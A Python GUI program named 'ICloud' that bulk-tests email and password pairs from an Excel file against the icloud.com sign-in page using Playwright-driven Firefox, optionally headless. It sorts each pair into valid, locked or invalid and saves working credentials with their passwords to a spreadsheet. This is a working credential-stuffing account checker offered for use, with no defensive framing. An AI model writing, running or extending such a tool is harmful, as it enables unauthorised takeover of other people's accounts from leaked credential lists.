
from playwright.sync_api import sync_playwright,expect
from openpyxl import load_workbook
from openpyxl import load_workbook
from PIL import Image,ImageTk
import sys
import os
from customtkinter import *

from tkinter import filedialog
from time import sleep




# from customtkinter.windows.widgets import ctk_button

def open_file_dialog_entry1():
    file_path1 = filedialog.askopenfilename(title="Select a file")
    if file_path1:
        gmails_entery_path.delete(0,END)
        gmails_entery_path.insert(0,file_path1)
        

        return file_path1
        # root.destroy()
    else:
        return None

def open_file_dialog_entry2():
    file_path2 = filedialog.askopenfilename(title="Select a file")
    if file_path2:
        output_entery_path.delete(0,END)
        output_entery_path.insert(0,file_path2)

        return file_path2       
        # return file_path2
    else:
        return None


# Create the main window


root =CTk()
root.title("ICloud")
root.geometry("890x700")
set_appearance_mode("dark")
# set_default_color_theme("green")
root.resizable(False,False)
set_widget_scaling(1.4)  # widget dimensions and text size
# set_window_scaling(2)  # window geometry dimensions
# deactivate_automatic_dpi_awareness()
# root.wm_attributes('-topmost',True)
##--------icon windows --------
iconpath=ImageTk.PhotoImage(file=os.path.join("assets","apple.ico"))
root.wm_iconbitmap()
root.iconphoto(False,iconpath)
##-----------------------------





def checkbox_internet_value():
   return check_varint.get()


check_varint = StringVar(value="off")
checkbox =CTkCheckBox(root, text="Slow Internet", hover_color='#00C3FF',command=checkbox_internet_value,variable=check_varint, onvalue="on", offvalue="off")
checkbox.place(relx=0.19,rely=0.54)


def checkbox_headless_value():
   return check_varhead.get()


check_varhead = StringVar(value="off")
checkbox =CTkCheckBox(root, text="Headless Mode",hover_color='#00C3FF', command=checkbox_headless_value,variable=check_varhead, onvalue="on", offvalue="off")
checkbox.place(relx=0.50,rely=0.54)

###slow internet###########################
def slowtime():
    
    slowetime=3
    if checkbox_internet_value()=="on":
        slowetime=5
    return slowetime
def headlessing():
    
    headlissing=False
    if checkbox_headless_value()=="on":
        headlissing=True
    return headlissing

##################################################
path=os.getcwd()

images_Path=fr"{path}\images"

back_ground_image=ImageTk.PhotoImage(Image.open(fr"{images_Path}\apple (2).png").resize((100,100)))
l1=CTkLabel(master=root,image=back_ground_image,text="")
l1.place(x=290,y=10)



###### Gmails Path

gmails_entery_path=CTkEntry(master=root,width=500,height=33,placeholder_text="Gmails Excell file.xlsx")

gmails_entery_path.place(x=20,y=100)

button_dialog_gmails=CTkButton(master=root,text="Choose",fg_color="#141414",hover_color='#00C3FF',width=20,height=33,command=open_file_dialog_entry1).place(x=530,y=100)


##### output Excell File

output_entery_path=CTkEntry(master=root,width=500,height=33,placeholder_text="Output Excell file.xlsx")
output_entery_path.place(x=20,y=200)

button_dialog_output=CTkButton(master=root,text="Choose",fg_color="#141414",hover_color='#00C3FF',width=20,height=33,command=open_file_dialog_entry2).place(x=530,y=200)
















class App:

    
    

    email=[]
    password=[]
    ###### output ##### 


    @staticmethod
    def collect(gmails_path):
        #open Excell
        # GUI Path
        # gmails_path="/home/fares/Desktop/Windows Checker/200email.xlsx"
        
        Excelle_Path=fr"{gmails_path}"
        wb=load_workbook(fr"{Excelle_Path}")
        ws=wb["Sheet1"]


        #collect all emails from Excelle
        var=1
        while var>=1:
                
            Emails=ws[f"A{var}"].value
            Passwords=ws[f"B{var}"].value
            
                
            App.email.append(Emails)
            App.password.append(Passwords)

                
            var +=1

            if Emails==None:
                App.email.pop(-1)
                App.password.pop(-1)
                    
                break





def outs(output_path,valid_gmails,valid_passwords,invalid_gmails,ID_locked,ID_locked_password):

    wb=load_workbook(fr"{output_path}")
    ws=wb["Sheet1"]
    ws[f"A1"].value="Valid Gmails"
    ws[f"B1"].value="Passwords"
    ws[f"D1"].value="Apple ID locked"
    ws[f"E1"].value="Passwords"
    ws[f"G1"].value="Invalid Gmails Gmail or Password Wrong"
    
    for var in range(2,len(valid_gmails)+2):
        gmail=valid_gmails[var-2]
        password=valid_passwords[var-2]
        ws[f"A{var}"].value=gmail
        ws[f"B{var}"].value=password

    #-----------------------------------

    for var in range(2,len(ID_locked)+2):
        gmail=ID_locked[var-2]
        password=ID_locked_password[var-2]
        ws[f"D{var}"].value=gmail
        ws[f"E{var}"].value=password
    
    for var in range(2,len(invalid_gmails)+2):
        gmail=invalid_gmails[var-2]
        # password=passwords_valids[var-2]
        ws[f"G{var}"].value=gmail
        # ws[f"B{var}"].value=password



    wb.save(fr"{output_path}")
    wb.close()

# ##################### Check ###3

def get_pathes():

    gmails_path=gmails_entery_path.get()
    output_path=output_entery_path.get()
    return (gmails_path,output_path)





def clear_column_except_header(sheet, column_index):
    for row_num, row in enumerate(sheet.iter_rows(min_col=column_index, max_col=column_index), start=1):
        for cell in row:
            if row_num > 1:  # Skip the header row
                cell.value = None  # You can also use an empty string by setting cell.value = ''









def clear_garbage(output_path):

    
    wb = load_workbook(fr"{output_path}")
    sheet = wb["Sheet1"]

    
    for column_to_clear in range(1,8):  # Replace with the desired column index (1-based index)
        clear_column_except_header(sheet, column_to_clear)

    # Save the changes
    wb.save(fr"{output_path}")
    wb.close()





def  AppMAin(email,password,output_path):
    with sync_playwright() as p:

    
      
        


        n = len(email)-1
        iter_step = 1/n
        r=(abs(int(iter_step)-(iter_step)))/iter_step
        
        progress_step = iter_step
        # progress_step = iter_step
        procbar.start()


        # page = context.new_page() 
        # App.collect()
        valid_gmails=[]
        valid_passwords=[]
        invalid_gmails=[]
        ID_locked=[]
        ID_locked_password=[]
        try:


            for ep in range(len(email)):
                browser = p.firefox.launch(headless=headlessing(),slow_mo=slowtime()*15) #,slow_mo=slowtime()*15
                page = browser.new_page()
                page.goto("https://www.icloud.com/") 
                page.get_by_role("button", name="Sign In").click()
                page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_label("Email or Phone Number").click()
                page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_label("Email or Phone Number").fill(f"{email[ep]}")
                
                page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_label("Continue").click()
                page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_label("Password").fill(f"{password[ep]}")
                page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_label("Sign In").click()       
                # Get all popups when they open
                
                try:
                    # Error of gmail or password
                    error_pop=page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_text("Your Apple ID or password was incorrect. Forgot password?Opens in a new window.")
                    expect(error_pop).to_be_visible(timeout=slowtime()*1000)
                    # print("popup exist")
                    #---------------------------------------------------------------------------------
                    labelproc.configure(text=f"Checking....left {len(email)-ep-1} gmail")
                    labelproc.update()
                    procbar.set(progress_step)
                    progress_step += iter_step
                    #---------------------------------------------------------------------------------
                    invalid_gmails.append(email[ep])
                    page.close()
                    browser.close()
                    continue

                except:
                    #ivalid => ID has been locked 
                    try:
                        locked_id=page.frame_locator("iframe[name=\"aid-auth-widget\"]").get_by_role("heading", name="This Apple ID has been locked")
                        expect(locked_id).to_be_visible(timeout=slowtime()*1000)
                        # print("locked ID")
                        
                        #---------------------------------------------------------------------------------
                        labelproc.configure(text=f"Checking....left {len(email)-ep-1} gmail")
                        labelproc.update()
                        procbar.set(progress_step)
                        progress_step += iter_step
                        #---------------------------------------------------------------------------------
                        ID_locked.append(email[ep])
                        ID_locked_password.append(password[ep])
                        page.close()
                        browser.close()
                        continue
                    except:# allcomes is valid
                        # print("Valid Gmail")
                        #---------------------------------------------------------------------------------
                        labelproc.configure(text=f"Checking....left {len(email)-ep-1} gmail")
                        labelproc.update()
                        procbar.set(progress_step)
                        progress_step += iter_step
                        #---------------------------------------------------------------------------------
                        valid_gmails.append(email[ep])
                        valid_passwords.append(password[ep])
                        page.close()
                        browser.close()
                        continue
     


        except:

            procbar.stop()
            clear_garbage(output_path)
            # output_path="/home/fares/Desktop/Windows Checker/output.xlsx"
            outs(output_path,valid_gmails,valid_passwords,invalid_gmails,ID_locked,ID_locked_password)

        else:
            procbar.stop()
            clear_garbage(output_path)
            # output_path="/home/fares/Desktop/Windows Checker/output.xlsx"
            outs(output_path,valid_gmails,valid_passwords,invalid_gmails,ID_locked,ID_locked_password)

        




def runApp():
    #collect  data
    procbar.set(0)
    App.email.clear()
    App.password.clear()
    slowtime()
    headlessing()
    get_pathes()
    App.collect(gmails_path=get_pathes()[0])
    

        
    AppMAin(email=App.email,password=App.password,output_path=get_pathes()[1])
        



images_Path=fr"{path}\images"
img2=CTkImage(Image.open(fr"{images_Path}\email.png").resize((20,20)))


procbar=CTkProgressBar(master=root,width=400,height=10,progress_color="#00C3FF",mode="determinate")
procbar.set(0)
procbar.place(relx=0.19,rely=0.7)

labelproc=CTkLabel(master=root,text="Checking...")
labelproc.place(relx=0.19,rely=0.61)

button_check=CTkButton(master=root,text="Check",height=33,image=img2,compound="left",fg_color="#141414", hover_color='#00C3FF',command=runApp).place(x=250,y=400)



root.mainloop()
